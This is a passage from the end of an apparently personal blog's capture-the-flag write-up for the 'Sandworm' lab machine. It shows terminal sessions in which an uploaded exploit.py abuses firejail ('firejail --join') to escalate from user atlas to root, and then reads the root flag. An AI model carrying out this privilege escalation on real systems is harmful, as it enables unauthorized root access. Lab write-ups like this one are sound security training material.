 <span class="o">*</span> <span class="n">Support</span><span class="p">:</span>        <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">advantage</span>

  <span class="n">System</span> <span class="n">information</span> <span class="k">as</span> <span class="n">of</span> <span class="n">Sat</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">10</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">21</span> <span class="n">PM</span> <span class="n">UTC</span> <span class="mi">2023</span>

  <span class="n">System</span> <span class="n">load</span><span class="p">:</span>           <span class="mf">0.0</span>
  <span class="n">Usage</span> <span class="n">of</span> <span class="o">/</span><span class="p">:</span>            <span class="mf">78.5</span><span class="o">%</span> <span class="n">of</span> <span class="mf">11.65</span><span class="n">GB</span>
  <span class="n">Memory</span> <span class="n">usage</span><span class="p">:</span>          <span class="mi">23</span><span class="o">%</span>
  <span class="n">Swap</span> <span class="n">usage</span><span class="p">:</span>            <span class="mi">0</span><span class="o">%</span>
  <span class="n">Processes</span><span class="p">:</span>             <span class="mi">251</span>
  <span class="n">Users</span> <span class="n">logged</span> <span class="ow">in</span><span class="p">:</span>       <span class="mi">0</span>
  <span class="n">IPv4</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="mf">10.10.11.218</span>
  <span class="n">IPv6</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="n">dead</span><span class="p">:</span><span class="n">beef</span><span class="p">::</span><span class="mi">250</span><span class="p">:</span><span class="mi">56</span><span class="n">ff</span><span class="p">:</span><span class="n">feb9</span><span class="p">:</span><span class="mi">40</span><span class="n">b8</span>


<span class="n">Expanded</span> <span class="n">Security</span> <span class="n">Maintenance</span> <span class="k">for</span> <span class="n">Applications</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">enabled</span><span class="o">.</span>

<span class="mi">0</span> <span class="n">updates</span> <span class="n">can</span> <span class="n">be</span> <span class="n">applied</span> <span class="n">immediately</span><span class="o">.</span>

<span class="n">Enable</span> <span class="n">ESM</span> <span class="n">Apps</span> <span class="n">to</span> <span class="n">receive</span> <span class="n">additional</span> <span class="n">future</span> <span class="n">security</span> <span class="n">updates</span><span class="o">.</span>
<span class="n">See</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">esm</span> <span class="ow">or</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">pro</span> <span class="n">status</span>


<span class="n">The</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">available</span> <span class="n">updates</span> <span class="ow">is</span> <span class="n">more</span> <span class="n">than</span> <span class="n">a</span> <span class="n">week</span> <span class="n">old</span><span class="o">.</span>
<span class="n">To</span> <span class="n">check</span> <span class="k">for</span> <span class="n">new</span> <span class="n">updates</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span>
<span class="n">Failed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">changelogs</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">meta</span><span class="o">-</span><span class="n">release</span><span class="o">-</span><span class="n">lts</span><span class="o">.</span> <span class="n">Check</span> <span class="n">your</span> <span class="n">Internet</span> <span class="n">connection</span> <span class="ow">or</span> <span class="n">proxy</span> <span class="n">settings</span>


<span class="n">Last</span> <span class="n">login</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">22</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">37</span> <span class="mi">2023</span> <span class="kn">from</span> <span class="mf">10.10.16.7</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

After uploading the exploit to the victim machine, let's execute it:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
<span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="n">needs</span> <span class="n">to</span> <span class="n">have</span> <span class="n">the</span> <span class="n">execute</span> <span class="n">bit</span> <span class="nb">set</span> <span class="k">for</span> <span class="n">the</span> <span class="n">exploit</span> <span class="n">to</span> <span class="n">work</span><span class="o">.</span> <span class="n">Run</span> <span class="err">`</span><span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="err">`</span> <span class="ow">and</span> <span class="k">try</span> <span class="n">again</span><span class="o">.</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
</pre></div>

It appears that the program requires execution privileges to work.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
</pre></div>

Now, let's try to execute it:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="o">./</span><span class="n">exploit</span><span class="o">.</span><span class="n">py</span> 
<span class="n">You</span> <span class="n">can</span> <span class="n">now</span> <span class="n">run</span> <span class="s1">'firejail --join=22803'</span> <span class="ow">in</span> <span class="n">another</span> <span class="n">terminal</span> <span class="n">to</span> <span class="n">obtain</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">where</span> <span class="s1">'sudo su -'</span> <span class="n">should</span> <span class="n">grant</span> <span class="n">you</span> <span class="n">a</span> <span class="n">root</span> <span class="n">shell</span><span class="o">.</span>
</pre></div>

It works, and it suggests that in another terminal, we can obtain a root shell using <code>sudo su -</code>. First, we need to attach to that process ID:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">firejail</span> <span class="o">--</span><span class="n">join</span><span class="o">=</span><span class="mi">22803</span>
<span class="n">changing</span> <span class="n">root</span> <span class="n">to</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="mi">22803</span><span class="o">/</span><span class="n">root</span>
<span class="ne">Warning</span><span class="p">:</span> <span class="n">cleaning</span> <span class="nb">all</span> <span class="n">supplementary</span> <span class="n">groups</span>
<span class="n">Child</span> <span class="n">process</span> <span class="n">initialized</span> <span class="ow">in</span> <span class="mf">11.35</span> <span class="n">ms</span>
<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

Now, you can simply run the <code>su</code> command, and you will obtain a shell as root:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">su</span>
<span class="nd">root@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="root1"># </span><span class="n">whoami</span>
<span class="n">root</span>
<span class="nd">root@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="root1"># </span><span class="n">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
<span class="nd">root@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="root1">#</span><span class="n"></span>
</pre></div>

Finally, you will be able to read the last flag:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">root@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="root1">#</span><span class="n"> cd /root</span>
<span class="nd">root@sandworm</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"> cat root.txt</span>
<span class="mi">3498205</span><span class="n">da1d717f043d4a64415b1b8f3</span>
<span class="nd">root@sandworm</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"></span>
</pre></div></br></br></br></br></br></br></br></br></br></br></br>
            </div>
        </div>
    </section>

    <footer>
        <p>&copy; 2024 elswix.github.io</p>
    </footer>
</body>
</html>
